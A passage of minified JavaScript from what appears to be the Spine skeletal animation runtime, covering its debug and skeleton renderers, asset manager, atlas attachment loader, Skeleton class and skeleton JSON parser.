i=l[e];if(s&&s.indexOf(i.data.name)>-1)continue;if(!i.parent)continue;let r=i.data.length*i.a+i.worldX,n=i.data.length*i.c+i.worldY;t.rectLine(!0,i.worldX,i.worldY,r,n,this.boneWidth*this.scale)}this.drawSkeletonXY&&t.x(i,r,4*this.scale)}if(this.drawRegionAttachments){t.setColor(this.attachmentLineColor);let s=e.slots;for(let e=0,i=s.length;e<i;e++){let i=s[e],r=i.getAttachment();if(r instanceof wt){let e=r,s=this.vertices;e.computeWorldVertices(i,s,0,2),t.line(s[0],s[1],s[2],s[3]),t.line(s[2],s[3],s[4],s[5]),t.line(s[4],s[5],s[6],s[7]),t.line(s[6],s[7],s[0],s[1])}}}if(this.drawMeshHull||this.drawMeshTriangles){let s=e.slots;for(let e=0,i=s.length;e<i;e++){let i=s[e];if(!i.bone.active)continue;let r=i.getAttachment();if(!(r instanceof pt))continue;let n=r,a=this.vertices;n.computeWorldVertices(i,0,n.worldVerticesLength,a,0,2);let o=n.triangles,l=n.hullLength;if(this.drawMeshTriangles){t.setColor(this.triangleLineColor);for(let e=0,s=o.length;e<s;e+=3){let s=2*o[e],i=2*o[e+1],r=2*o[e+2];t.triangle(!1,a[s],a[s+1],a[i],a[i+1],a[r],a[r+1])}}if(this.drawMeshHull&&l>0){t.setColor(this.attachmentLineColor),l=2*(l>>1);let e=a[l-2],s=a[l-1];for(let i=0,r=l;i<r;i+=2){let r=a[i],n=a[i+1];t.line(r,n,e,s),e=r,s=n}}}}if(this.drawBoundingBoxes){let s=this.bounds;s.update(e,!0),t.setColor(this.aabbColor),t.rect(!1,s.minX,s.minY,s.getWidth(),s.getHeight());let i=s.polygons,r=s.boundingBoxes;for(let e=0,s=i.length;e<s;e++){let s=i[e];t.setColor(r[e].color),t.polygon(s,0,s.length)}}if(this.drawPaths){let s=e.slots;for(let e=0,i=s.length;e<i;e++){let i=s[e];if(!i.bone.active)continue;let r=i.getAttachment();if(!(r instanceof bt))continue;let n=r,o=n.worldVerticesLength,l=this.temp=a.setArraySize(this.temp,o,0);n.computeWorldVertices(i,0,o,l,0,2);let h=this.pathColor,c=l[2],d=l[3],u=0,m=0;if(n.closed){t.setColor(h);let e=l[0],s=l[1],i=l[o-2],r=l[o-1];u=l[o-4],m=l[o-3],t.curve(c,d,e,s,i,r,u,m,32),t.setColor(Ae.LIGHT_GRAY),t.line(c,d,e,s),t.line(u,m,i,r)}o-=4;for(let e=4;e<o;e+=6){let s=l[e],i=l[e+1],r=l[e+2],n=l[e+3];u=l[e+4],m=l[e+5],t.setColor(h),t.curve(c,d,s,i,r,n,u,m,32),t.setColor(Ae.LIGHT_GRAY),t.line(c,d,s,i),t.line(u,m,r,n),c=u,d=m}}}if(this.drawBones){t.setColor(this.boneOriginColor);for(let e=0,i=l.length;e<i;e++){let i=l[e];s&&s.indexOf(i.data.name)>-1||t.circle(!0,i.worldX,i.worldY,3*this.scale,Ae.GREEN,8)}}if(this.drawClipping){let s=e.slots;t.setColor(this.clipColor);for(let e=0,i=s.length;e<i;e++){let i=s[e];if(!i.bone.active)continue;let r=i.getAttachment();if(!(r instanceof it))continue;let n=r,o=n.worldVerticesLength,l=this.temp=a.setArraySize(this.temp,o,0);n.computeWorldVertices(i,0,o,l,0,2);for(let e=0,s=l.length;e<s;e+=2){let s=l[e],i=l[e+1],r=l[(e+2)%l.length],n=l[(e+3)%l.length];t.line(s,i,r,n)}}}}dispose(){}}Ae.LIGHT_GRAY=new r(192/255,192/255,192/255,1),Ae.GREEN=new r(0,1,0,1);class Ce{constructor(t,e,s){this.vertices=t,this.numVertices=e,this.numFloats=s}}class Se{constructor(t,e=!0){this.premultipliedAlpha=!1,this.tempColor=new r,this.tempColor2=new r,this.vertexSize=8,this.twoColorTint=!1,this.renderable=new Ce([],0,0),this.clipper=new Vt,this.temp=new l,this.temp2=new l,this.temp3=new r,this.temp4=new r,this.twoColorTint=e,e&&(this.vertexSize+=4),this.vertices=a.newFloatArray(1024*this.vertexSize)}draw(t,e,s=-1,i=-1){let r=this.clipper,n=this.premultipliedAlpha,o=this.twoColorTint,l=null;this.temp,this.temp2,this.temp3,this.temp4;let h,c,d,u=this.renderable,m=e.drawOrder,f=e.color,g=o?12:8,p=!1;-1==s&&(p=!0);for(let e=0,b=m.length;e<b;e++){let b=r.isClipping()?2:g,x=m[e];if(!x.bone.active){r.clipEndWithSlot(x);continue}if(s>=0&&s==x.data.index&&(p=!0),!p){r.clipEndWithSlot(x);continue}i>=0&&i==x.data.index&&(p=!1);let w,y=x.getAttachment();if(y instanceof wt){let t=y;u.vertices=this.vertices,u.numVertices=4,u.numFloats=b<<2,t.computeWorldVertices(x,u.vertices,0,b),c=Se.QUAD_TRIANGLES,h=t.uvs,w=t.region.renderObject.page.texture,d=t.color}else{if(!(y instanceof pt)){if(y instanceof it){let t=y;r.clipStart(x,t);continue}r.clipEndWithSlot(x);continue}{let t=y;u.vertices=this.vertices,u.numVertices=t.worldVerticesLength>>1,u.numFloats=u.numVertices*b,u.numFloats>u.vertices.length&&(u.vertices=this.vertices=a.newFloatArray(u.numFloats)),t.computeWorldVertices(x,0,t.worldVerticesLength,u.vertices,0,b),c=t.triangles,w=t.region.renderObject.page.texture,h=t.uvs,d=t.color}}if(w){let e=x.color,s=this.tempColor;s.r=f.r*e.r*d.r,s.g=f.g*e.g*d.g,s.b=f.b*e.b*d.b,s.a=f.a*e.a*d.a,n&&(s.r*=s.a,s.g*=s.a,s.b*=s.a);let i=this.tempColor2;x.darkColor?(n?(i.r=x.darkColor.r*s.a,i.g=x.darkColor.g*s.a,i.b=x.darkColor.b*s.a):i.setFromColor(x.darkColor),i.a=n?1:0):i.set(0,0,0,1);let a=x.data.blendMode;if(a!=l&&(l=a,t.setBlendMode($t.getSourceColorGLBlendMode(l,n),$t.getSourceAlphaGLBlendMode(l),$t.getDestGLBlendMode(l))),r.isClipping()){r.clipTriangles(u.vertices,u.numFloats,c,c.length,h,s,i,o);let e=new Float32Array(r.clippedVertices),n=r.clippedTriangles;t.draw(w,e,n)}else{let e=u.vertices;if(o)for(let t=2,r=0,n=u.numFloats;t<n;t+=g,r+=2)e[t]=s.r,e[t+1]=s.g,e[t+2]=s.b,e[t+3]=s.a,e[t+4]=h[r],e[t+5]=h[r+1],e[t+6]=i.r,e[t+7]=i.g,e[t+8]=i.b,e[t+9]=i.a;else for(let t=2,i=0,r=u.numFloats;t<r;t+=g,i+=2)e[t]=s.r,e[t+1]=s.g,e[t+2]=s.b,e[t+3]=s.a,e[t+4]=h[i],e[t+5]=h[i+1];let r=u.vertices.subarray(0,u.numFloats);t.draw(w,r,c)}}r.clipEndWithSlot(x)}r.clipEnd()}}Se.QUAD_TRIANGLES=[0,1,2,2,3,0];new r(1,1,1,1);var ke;e.Pf=void 0,(ke=e.Pf||(e.Pf={}))[ke.Stretch=0]="Stretch",ke[ke.Expand=1]="Expand",ke[ke.Fit=2]="Fit";e.SR=z,e.OZ=class{constructor(t){if(this.animationToMixTime={},this.defaultMix=0,!t)throw new Error("skeletonData cannot be null.");this.skeletonData=t}setMix(t,e,s){let i=this.skeletonData.findAnimation(t);if(!i)throw new Error("Animation not found: "+t);let r=this.skeletonData.findAnimation(e);if(!r)throw new Error("Animation not found: "+e);this.setMixWith(i,r,s)}setMixWith(t,e,s){if(!t)throw new Error("from cannot be null.");if(!e)throw new Error("to cannot be null.");let i=t.name+"."+e.name;this.animationToMixTime[i]=s}getMix(t,e){let s=t.name+"."+e.name,i=this.animationToMixTime[s];return void 0===i?this.defaultMix:i}},e.me=class extends class{constructor(t,e="",s=new Ct){this.pathPrefix="",this.assets={},this.errors={},this.toLoad=0,this.loaded=0,this.textureLoader=t,this.pathPrefix=e,this.downloader=s}start(t){return this.toLoad++,this.pathPrefix+t}success(t,e,s){this.toLoad--,this.loaded++,this.assets[e]=s,t&&t(e,s)}error(t,e,s){this.toLoad--,this.loaded++,this.errors[e]=s,t&&t(e,s)}loadAll(){return new Promise(((t,e)=>{let s=()=>{this.isLoadingComplete()?this.hasErrors()?e(this.errors):t(this):requestAnimationFrame(s)};requestAnimationFrame(s)}))}setRawDataURI(t,e){this.downloader.rawDataUris[this.pathPrefix+t]=e}loadBinary(t,e=(()=>{}),s=(()=>{})){t=this.start(t),this.downloader.downloadBinary(t,(s=>{this.success(e,t,s)}),((e,i)=>{this.error(s,t,`Couldn't load binary ${t}: status ${e}, ${i}`)}))}loadText(t,e=(()=>{}),s=(()=>{})){t=this.start(t),this.downloader.downloadText(t,(s=>{this.success(e,t,s)}),((e,i)=>{this.error(s,t,`Couldn't load text ${t}: status ${e}, ${i}`)}))}loadJson(t,e=(()=>{}),s=(()=>{})){t=this.start(t),this.downloader.downloadJson(t,(s=>{this.success(e,t,s)}),((e,i)=>{this.error(s,t,`Couldn't load JSON ${t}: status ${e}, ${i}`)}))}loadTexture(t,e=(()=>{}),s=(()=>{})){if(t=this.start(t),"undefined"!=typeof window&&"undefined"!=typeof navigator&&window.document){let i=new Image;i.crossOrigin="anonymous",i.onload=()=>{this.success(e,t,this.textureLoader(i))},i.onerror=()=>{this.error(s,t,`Couldn't load image: ${t}`)},this.downloader.rawDataUris[t]&&(t=this.downloader.rawDataUris[t]),i.src=t}else fetch(t,{mode:"cors"}).then((e=>e.ok?e.blob():(this.error(s,t,`Couldn't load image: ${t}`),null))).then((t=>t?createImageBitmap(t,{premultiplyAlpha:"none",colorSpaceConversion:"none"}):null)).then((s=>{s&&this.success(e,t,this.textureLoader(s))}))}loadTextureAtlas(t,e=(()=>{}),s=(()=>{}),i){let r=t.lastIndexOf("/"),n=r>=0?t.substring(0,r+1):"";t=this.start(t),this.downloader.downloadText(t,(r=>{try{let a=new ut(r),o=a.pages.length,l=!1;for(let r of a.pages)this.loadTexture(i?i[r.name]:n+r.name,((s,i)=>{l||(r.setTexture(i),0==--o&&this.success(e,t,a))}),((e,i)=>{l||this.error(s,t,`Couldn't load texture atlas ${t} page image: ${e}`),l=!0}))}catch(e){this.error(s,t,`Couldn't parse texture atlas ${t}: ${e.message}`)}}),((e,i)=>{this.error(s,t,`Couldn't load texture atlas ${t}: status ${e}, ${i}`)}))}get(t){return this.assets[this.pathPrefix+t]}require(t){t=this.pathPrefix+t;let e=this.assets[t];if(e)return e;let s=this.errors[t];throw Error("Asset not found: "+t+(s?"\n"+s:""))}remove(t){t=this.pathPrefix+t;let e=this.assets[t];return e.dispose&&e.dispose(),delete this.assets[t],e}removeAll(){for(let t in this.assets){let e=this.assets[t];e.dispose&&e.dispose()}this.assets={}}isLoadingComplete(){return 0==this.toLoad}getToLoad(){return this.toLoad}getLoaded(){return this.loaded}dispose(){this.removeAll()}hasErrors(){return Object.keys(this.errors).length>0}getErrors(){return this.errors}}{constructor(t,e="",s=new Ct){super((e=>new Gt(t,e)),e,s)}},e.N0=class{constructor(t){this.atlas=t}loadSequence(t,e,s){let i=s.regions;for(let r=0,n=i.length;r<n;r++){let n=s.getPath(e,r),a=this.atlas.findRegion(n);if(null==a)throw new Error("Region not found in atlas: "+n+" (sequence: "+t+")");i[r]=a,i[r].renderObject=i[r]}}newRegionAttachment(t,e,s,i){let r=new wt(e,s);if(null!=i)this.loadSequence(e,s,i);else{let t=this.atlas.findRegion(s);if(!t)throw new Error("Region not found in atlas: "+s+" (region attachment: "+e+")");t.renderObject=t,r.region=t}return r}newMeshAttachment(t,e,s,i){let r=new pt(e,s);if(null!=i)this.loadSequence(e,s,i);else{let t=this.atlas.findRegion(s);if(!t)throw new Error("Region not found in atlas: "+s+" (mesh attachment: "+e+")");t.renderObject=t,r.region=t}return r}newBoundingBoxAttachment(t,e){return new st(e)}newPathAttachment(t,e){return new bt(e)}newPointAttachment(t,e){return new xt(e)}newClippingAttachment(t,e){return new it(e)}},e.yG=de,e.OR=ve,e.ex=ue,e.Od=class{constructor(t){if(this._updateCache=new Array,this.skin=null,this.scaleX=1,this.scaleY=1,this.x=0,this.y=0,!t)throw new Error("data cannot be null.");this.data=t,this.bones=new Array;for(let e=0;e<t.bones.length;e++){let s,i=t.bones[e];if(i.parent){let t=this.bones[i.parent.index];s=new vt(i,this,t),t.children.push(s)}else s=new vt(i,this,null);this.bones.push(s)}this.slots=new Array,this.drawOrder=new Array;for(let e=0;e<t.slots.length;e++){let s=t.slots[e],i=this.bones[s.boneData.index],r=new It(s,i);this.slots.push(r),this.drawOrder.push(r)}this.ikConstraints=new Array;for(let e=0;e<t.ikConstraints.length;e++){let s=t.ikConstraints[e];this.ikConstraints.push(new Et(s,this))}this.transformConstraints=new Array;for(let e=0;e<t.transformConstraints.length;e++){let s=t.transformConstraints[e];this.transformConstraints.push(new Xt(s,this))}this.pathConstraints=new Array;for(let e=0;e<t.pathConstraints.length;e++){let s=t.pathConstraints[e];this.pathConstraints.push(new Tt(s,this))}this.color=new r(1,1,1,1),this.updateCache()}updateCache(){this._updateCache.length=0;let t=this.bones;for(let e=0,s=t.length;e<s;e++){let s=t[e];s.sorted=s.data.skinRequired,s.active=!s.sorted}if(this.skin){let t=this.skin.bones;for(let e=0,s=this.skin.bones.length;e<s;e++){let s=this.bones[t[e].index];do{s.sorted=!1,s.active=!0,s=s.parent}while(s)}}let e=this.ikConstraints,s=this.transformConstraints,i=this.pathConstraints,r=e.length,n=s.length,a=i.length,o=r+n+a;t:for(let t=0;t<o;t++){for(let s=0;s<r;s++){let i=e[s];if(i.data.order==t){this.sortIkConstraint(i);continue t}}for(let e=0;e<n;e++){let i=s[e];if(i.data.order==t){this.sortTransformConstraint(i);continue t}}for(let e=0;e<a;e++){let s=i[e];if(s.data.order==t){this.sortPathConstraint(s);continue t}}}for(let e=0,s=t.length;e<s;e++)this.sortBone(t[e])}sortIkConstraint(t){if(t.active=t.target.isActive()&&(!t.data.skinRequired||this.skin&&a.contains(this.skin.constraints,t.data,!0)),!t.active)return;let e=t.target;this.sortBone(e);let s=t.bones,i=s[0];if(this.sortBone(i),1==s.length)this._updateCache.push(t),this.sortReset(i.children);else{let e=s[s.length-1];this.sortBone(e),this._updateCache.push(t),this.sortReset(i.children),e.sorted=!0}}sortPathConstraint(t){if(t.active=t.target.bone.isActive()&&(!t.data.skinRequired||this.skin&&a.contains(this.skin.constraints,t.data,!0)),!t.active)return;let e=t.target,s=e.data.index,i=e.bone;this.skin&&this.sortPathConstraintAttachment(this.skin,s,i),this.data.defaultSkin&&this.data.defaultSkin!=this.skin&&this.sortPathConstraintAttachment(this.data.defaultSkin,s,i);for(let t=0,e=this.data.skins.length;t<e;t++)this.sortPathConstraintAttachment(this.data.skins[t],s,i);let r=e.getAttachment();r instanceof bt&&this.sortPathConstraintAttachmentWith(r,i);let n=t.bones,o=n.length;for(let t=0;t<o;t++)this.sortBone(n[t]);this._updateCache.push(t);for(let t=0;t<o;t++)this.sortReset(n[t].children);for(let t=0;t<o;t++)n[t].sorted=!0}sortTransformConstraint(t){if(t.active=t.target.isActive()&&(!t.data.skinRequired||this.skin&&a.contains(this.skin.constraints,t.data,!0)),!t.active)return;this.sortBone(t.target);let e=t.bones,s=e.length;if(t.data.local)for(let t=0;t<s;t++){let s=e[t];this.sortBone(s.parent),this.sortBone(s)}else for(let t=0;t<s;t++)this.sortBone(e[t]);this._updateCache.push(t);for(let t=0;t<s;t++)this.sortReset(e[t].children);for(let t=0;t<s;t++)e[t].sorted=!0}sortPathConstraintAttachment(t,e,s){let i=t.attachments[e];if(i)for(let t in i)this.sortPathConstraintAttachmentWith(i[t],s)}sortPathConstraintAttachmentWith(t,e){if(!(t instanceof bt))return;let s=t.bones;if(s){let t=this.bones;for(let e=0,i=s.length;e<i;){let i=s[e++];for(i+=e;e<i;)this.sortBone(t[s[e++]])}}else this.sortBone(e)}sortBone(t){if(!t)return;if(t.sorted)return;let e=t.parent;e&&this.sortBone(e),t.sorted=!0,this._updateCache.push(t)}sortReset(t){for(let e=0,s=t.length;e<s;e++){let s=t[e];s.active&&(s.sorted&&this.sortReset(s.children),s.sorted=!1)}}updateWorldTransform(){let t=this.bones;for(let e=0,s=t.length;e<s;e++){let s=t[e];s.ax=s.x,s.ay=s.y,s.arotation=s.rotation,s.ascaleX=s.scaleX,s.ascaleY=s.scaleY,s.ashearX=s.shearX,s.ashearY=s.shearY}let e=this._updateCache;for(let t=0,s=e.length;t<s;t++)e[t].update()}updateWorldTransformWith(t){let e=this.getRootBone();if(!e)throw new Error("Root bone must not be null.");let s=t.a,i=t.b,r=t.c,a=t.d;e.worldX=s*this.x+i*this.y+t.worldX,e.worldY=r*this.x+a*this.y+t.worldY;let o=e.rotation+90+e.shearY,l=n.cosDeg(e.rotation+e.shearX)*e.scaleX,h=n.cosDeg(o)*e.scaleY,c=n.sinDeg(e.rotation+e.shearX)*e.scaleX,d=n.sinDeg(o)*e.scaleY;e.a=(s*l+i*c)*this.scaleX,e.b=(s*h+i*d)*this.scaleX,e.c=(r*l+a*c)*this.scaleY,e.d=(r*h+a*d)*this.scaleY;let u=this._updateCache;for(let t=0,s=u.length;t<s;t++){let s=u[t];s!=e&&s.update()}}setToSetupPose(){this.setBonesToSetupPose(),this.setSlotsToSetupPose()}setBonesToSetupPose(){let t=this.bones;for(let e=0,s=t.length;e<s;e++)t[e].setToSetupPose();let e=this.ikConstraints;for(let t=0,s=e.length;t<s;t++){let s=e[t];s.mix=s.data.mix,s.softness=s.data.softness,s.bendDirection=s.data.bendDirection,s.compress=s.data.compress,s.stretch=s.data.stretch}let s=this.transformConstraints;for(let t=0,e=s.length;t<e;t++){let e=s[t],i=e.data;e.mixRotate=i.mixRotate,e.mixX=i.mixX,e.mixY=i.mixY,e.mixScaleX=i.mixScaleX,e.mixScaleY=i.mixScaleY,e.mixShearY=i.mixShearY}let i=this.pathConstraints;for(let t=0,e=i.length;t<e;t++){let e=i[t],s=e.data;e.position=s.position,e.spacing=s.spacing,e.mixRotate=s.mixRotate,e.mixX=s.mixX,e.mixY=s.mixY}}setSlotsToSetupPose(){let t=this.slots;a.arrayCopy(t,0,this.drawOrder,0,t.length);for(let e=0,s=t.length;e<s;e++)t[e].setToSetupPose()}getRootBone(){return 0==this.bones.length?null:this.bones[0]}findBone(t){if(!t)throw new Error("boneName cannot be null.");let e=this.bones;for(let s=0,i=e.length;s<i;s++){let i=e[s];if(i.data.name==t)return i}return null}findSlot(t){if(!t)throw new Error("slotName cannot be null.");let e=this.slots;for(let s=0,i=e.length;s<i;s++){let i=e[s];if(i.data.name==t)return i}return null}setSkinByName(t){let e=this.data.findSkin(t);if(!e)throw new Error("Skin not found: "+t);this.setSkin(e)}setSkin(t){if(t!=this.skin){if(t)if(this.skin)t.attachAll(this,this.skin);else{let e=this.slots;for(let s=0,i=e.length;s<i;s++){let i=e[s],r=i.data.attachmentName;if(r){let e=t.getAttachment(s,r);e&&i.setAttachment(e)}}}this.skin=t,this.updateCache()}}getAttachmentByName(t,e){let s=this.data.findSlot(t);if(!s)throw new Error(`Can't find slot with name ${t}`);return this.getAttachment(s.index,e)}getAttachment(t,e){if(!e)throw new Error("attachmentName cannot be null.");if(this.skin){let s=this.skin.getAttachment(t,e);if(s)return s}return this.data.defaultSkin?this.data.defaultSkin.getAttachment(t,e):null}setAttachment(t,e){if(!t)throw new Error("slotName cannot be null.");let s=this.slots;for(let i=0,r=s.length;i<r;i++){let r=s[i];if(r.data.name==t){let s=null;if(e&&(s=this.getAttachment(i,e),!s))throw new Error("Attachment not found: "+e+", for slot: "+t);return void r.setAttachment(s)}}throw new Error("Slot not found: "+t)}findIkConstraint(t){if(!t)throw new Error("constraintName cannot be null.");let e=this.ikConstraints;for(let s=0,i=e.length;s<i;s++){let i=e[s];if(i.data.name==t)return i}return null}findTransformConstraint(t){if(!t)throw new Error("constraintName cannot be null.");let e=this.transformConstraints;for(let s=0,i=e.length;s<i;s++){let i=e[s];if(i.data.name==t)return i}return null}findPathConstraint(t){if(!t)throw new Error("constraintName cannot be null.");let e=this.pathConstraints;for(let s=0,i=e.length;s<i;s++){let i=e[s];if(i.data.name==t)return i}return null}getBoundsRect(){let t=new l,e=new l;return this.getBounds(t,e),{x:t.x,y:t.y,width:e.x,height:e.y}}getBounds(t,e,s=new Array(2)){if(!t)throw new Error("offset cannot be null.");if(!e)throw new Error("size cannot be null.");let i=this.drawOrder,r=Number.POSITIVE_INFINITY,n=Number.POSITIVE_INFINITY,o=Number.NEGATIVE_INFINITY,l=Number.NEGATIVE_INFINITY;for(let t=0,e=i.length;t<e;t++){let e=i[t];if(!e.bone.active)continue;let h=0,c=null,d=e.getAttachment();if(d instanceof wt)h=8,c=a.setArraySize(s,h,0),d.computeWorldVertices(e,c,0,2);else if(d instanceof pt){let t=d;h=t.worldVerticesLength,c=a.setArraySize(s,h,0),t.computeWorldVertices(e,0,h,c,0,2)}if(c)for(let t=0,e=c.length;t<e;t+=2){let e=c[t],s=c[t+1];r=Math.min(r,e),n=Math.min(n,s),o=Math.max(o,e),l=Math.max(l,s)}}t.set(r,n),e.set(o-r,l-n)}},e.CE=class{constructor(t){this.scale=1,this.linkedMeshes=new Array,this.attachmentLoader=t}readSkeletonData(t){let s=this.scale,i=new Rt,n="string"==typeof t?JSON.parse(t):t,o=n.skeleton;if(o&&(i.hash=o.hash,i.version=o.spine,i.x=o.x,i.y=o.y,i.width=o.width,i.height=o.height,i.fps=o.fps,i.imagesPath=o.images),n.bones)for(let t=0;t<n.bones.length;t++){let r=n.bones[t],o=null,l=Ut(r,"parent",null);l&&(o=i.findBone(l));let h=new yt(i.bones.length,r.name,o);h.length=Ut(r,"length",0)*s,h.x=Ut(r,"x",0)*s,h.y=Ut(r,"y",0)*s,h.rotation=Ut(r,"rotation",0),h.scaleX=Ut(r,"scaleX",1),h.scaleY=Ut(r,"scaleY",1),h.shearX=Ut(r,"shearX",0),h.shearY=Ut(r,"shearY",0),h.transformMode=a.enumValue(e.Qe,Ut(r,"transform","Normal")),h.skinRequired=Ut(r,"skin",!1);let c=Ut(r,"color",null);c&&h.color.setFromString(c),i.bones.push(h)}if(n.slots)for(let t=0;t<n.slots.length;t++){let s=n.slots[t],o=i.findBone(s.bone);if(!o)throw new Error(`Couldn't find bone ${s.bone} for slot ${s.name}`);let l=new qt(i.slots.length,s.name,o),h=Ut(s,"color",null);h&&l.color.setFromString(h);let c=Ut(s,"dark",null);c&&(l.darkColor=r.fromString(c)),l.attachmentName=Ut(s,"attachment",null),l.blendMode=a.enumValue(e.bt,Ut(s,"blend","normal")),i.slots.push(l)}if(n.ik)for(let t=0;t<n.ik.length;t++){let e=n.ik[t],r=new Yt(e.name);r.order=Ut(e,"order",0),r.skinRequired=Ut(e,"skin",!1);for(let t=0;t<e.bones.length;t++){let s=i.findBone(e.bones[t]);if(!s)throw new Error(`Couldn't find bone ${e.bones[t]} for IK constraint ${e.name}.`);r.bones.push(s)}let a=i.findBone(e.target);if(!a)throw new Error(`Couldn't find target bone ${e.target} for IK constraint ${e.name}.`);r.target=a,r.mix=Ut(e,"mix",1),r.softness=Ut(e,"softness",0)*s,r.bendDirection=Ut(e,"bendPositive",!0)?1:-1,r.compress=Ut(e,"compress",!1),r.stretch=Ut(e,"stretch",!1),r.uniform=Ut(e,"uniform",!1),i.ikConstraints.push(r)}if(n.transform)for(let t=0;t<n.transform.length;t++){let e=n.transform[t],r=new Ft(e.name);r.order=Ut(e,"order",0),r.skinRequired=Ut(e,"skin",!1);for(let t=0;t<e.bones.length;t++){let s=e.bones[t],n=i.findBone(s);if(!n)throw new Error(`Couldn't find bone ${s} for transform constraint ${e.name}.`);r.bones.push(n)}let a=e.target,o=i.findBone(a);if(!o)throw new Error(`Couldn't find target bone ${a} for transform constraint ${e.name}.`);r.target=o,r.local=Ut(e,"local",!1),r.relative=Ut(e,"relative",!1),r.offsetRotation=Ut(e,"rotation",0),r.offsetX=Ut(e,"x",0)*s,r.offsetY=Ut(e,"y",0)*s,r.offsetScaleX=Ut(e,"scaleX",0),r.offsetScaleY=Ut(e,"scaleY",0),r.offsetShearY=Ut(e,"shearY",0),r.mixRotate=Ut(e,"mixRotate",1),r.mixX=Ut(e,"mixX",1),r.mixY=Ut(e,"mixY",r.mixX),r.mixScaleX=Ut(e,"mixScaleX",1),r.mixScaleY=Ut(e,"mixScaleY",r.mixScaleX),r.mixShearY=Ut(e,"mixShearY",1),i.transformConstraints.push(r)}if(n.path)for(let t=0;t<n.path.length;t++){let r=n.path[t],o=new Mt(r.name);o.order=Ut(r,"order",0),o.skinRequired=Ut(r,"skin",!1);for(let t=0;t<r.bones.length;t++){let e=r.bones[t],s=i.findBone(e);if(!s)throw new Error(`Couldn't find bone ${e} for path constraint ${r.name}.`);o.bones.push(s)}let l=r.target,h=i.findSlot(l);if(!h)throw new Error(`Couldn't find target slot ${l} for path constraint ${r.name}.`);o.target=h,o.positionMode=a.enumValue(e.T,Ut(r,"positionMode","Percent")),o.spacingMode=a.enumValue(e.m3,Ut(r,"spacingMode","Length")),o.rotateMode=a.enumValue(e.YK,Ut(r,"rotateMode","Tangent")),o.offsetRotation=Ut(r,"rotation",0),o.position=Ut(r,"position",0),o.positionMode==e.T.Fixed&&(o.position*=s),o.spacing=Ut(r,"spacing",0),o.spacingMode!=e.m3.Length&&o.spacingMode!=e.m3.Fixed||(o.spacing*=s),o.mixRotate=Ut(r,"mixRotate",1),o.mixX=Ut(r,"mixX",1),o.mixY=Ut(r,"mixY",o.mixX),i.pathConstraints.push(o)}if(n.skins)for(let t=0;t<n.skins.length;t++){let e=n.skins[t],s=new Pt(e.name);if(e.bones)for(let t=0;t<e.bones.length;t++){let r=e.bones[t],n=i.findBone(r);if(!n)throw new Error(`Couldn't find bone ${r} for skin ${e.name}.`);s.bones.push(n)}if(e.ik)for(let t=0;t<e.ik.length;t++){let r=e.ik[t],n=i.findIkConstraint(r);if(!n)throw new Error(`Couldn't find IK constraint ${r} for skin ${e.name}.`);s.constraints.push(n)}if(e.transform)for(let t=0;t<e.transform.length;t++){let r=e.transform[t],n=i.findTransformConstraint(r);if(!n)throw new Error(`Couldn't find transform constraint ${r} for skin ${e.name}.`);s.constraints.push(n)}if(e.path)for(let t=0;t<e.path.length;t++){let r=e.path[t],n=i.findPathConstraint(r);if(!n)throw new Error(`Couldn't find path constraint ${r} for skin ${e.name}.`);s.constraints.push(n)}for(let t in e.attachments){let r=i.findSlot(t);if(!r)throw new Error(`Couldn't find slot ${t} for skin ${e.name}.`);let n=e.attachments[t];for(let t in n){let e=this.readAttachment(n[t],s,r.index,t,i);e&&s.setAttachment(r.index,t,e)}}i.skins.push(s),"default"==s.name&&(i.defaultSkin=s)}for(let t=0,e=this.linkedMeshes.length;t<e;t++){let e=this.linkedMeshes[t],s=e.skin?i.findSkin(e.skin):i.defaultSkin;if(!s)throw new Error(`Skin not found: ${e.skin}`);let r=s.getAttachment(e.slotIndex,e.parent);if(!r)throw new Error(`Parent mesh not found: ${e.parent}`);e.mesh.timelineAttahment=e.inheritTimeline?r:e.mesh,e.mesh.setParentMesh(r),null!=e.mesh.region&&e.mesh.updateRegion()}if(this.linkedMeshes.length=0,n.events)for(let t in n.events){let e=n.events[t],s=new kt(t);s.intValue=Ut(e,"int",0),s.floatValue=Ut(e,"float",0),s.stringValue=Ut(e,"string",""),s.audioPath=Ut(e,"audio",null),s.audioPath&&(s.volume=Ut(e,"volume",1),s.balance=Ut(e,"balance",0)),i.events.push(s)}if(n.animations)for(let t in n.animations){let e=n.animations[t];this.readAnimation(e,t,i)}return i}readAttachment(t,e,s,i,r){let n=this.scale;switch(i=Ut(t,"name",i),Ut(t,"type","region")){case"region":{let s=Ut(t,"path",i),r=this.readSequence(Ut(t,"sequence",null)),a=this.attachmentLoader.newRegionAttachment(e,i,s,r);if(!a)return null;a.path=s,a.x=Ut(t,"x",0)*n,a.y=Ut(t,"y",0)*n,a.scaleX=Ut(t,"scaleX",1),a.scaleY=Ut(t,"scaleY",1),a.rotation=Ut(t,"rotation",0),a.width=t.width*n,a.height=t.height*n,a.sequence=r;let o=Ut(t,"color",null);return o&&a.color.setFromString(o),null!=a.region&&a.updateRegion(),a}case"boundingbox":{let s=this.attachmentLoader.newBoundingBoxAttachment(e,i);if(!s)return null;this.readVertices(t,s,t.vertexCount<<1);let r=Ut(t,"color",null);return r&&s.color.setFromString(r),s}case"mesh":case"linkedmesh":{let r=Ut(t,"path",i),a=this.readSequence(Ut(t,"sequence",null)),o=this.attachmentLoader.newMeshAttachment(e,i,r,a);if(!o)return null;o.path=r;let l=Ut(t,"color",null);l&&o.color.setFromString(l),o.width=Ut(t,"width",0)*n,o.height=Ut(t,"height",0)*n,o.sequence=a;let h=Ut(t,"parent",null);if(h)return this.linkedMeshes.push(new _t(o,Ut(t,"skin",null),s,h,Ut(t,"timelines",!0))),o;let c=t.uvs;return this.readVertices(t,o,c.length),o.triangles=t.triangles,o.regionUVs=c,null!=o.region&&o.updateRegion(),o.edges=Ut(t,"edges",null),o.hullLength=2*Ut(t,"hull",0),o}case"path":{let s=this.attachmentLoader.newPathAttachment(e,i);if(!s)return null;s.closed=Ut(t,"closed",!1),s.constantSpeed=Ut(t,"constantSpeed",!0);let r=t.vertexCount;this.readVertices(t,s,r<<1);let o=a.newArray(r/3,0);for(let e=0;e<t.lengths.length;e++)o[e]=t.lengths[e]*n;s.lengths=o;let l=Ut(t,"color",null);return l&&s.color.setFromString(l),s}case"point":{let s=this.attachmentLoader.newPointAttachment(e,i);if(!s)return null;s.x=Ut(t,"x",0)*n,s.y=Ut(t,"y",0)*n,s.rotation=Ut(t,"rotation",0);let r=Ut(t,"color",null);return r&&s.color.setFromString(r),s}case"clipping":{let s=this.attachmentLoader.newClippingAttachment(e,i);if(!s)return null;let n=Ut(t,"end",null);n&&(s.endSlot=r.findSlot(n));let 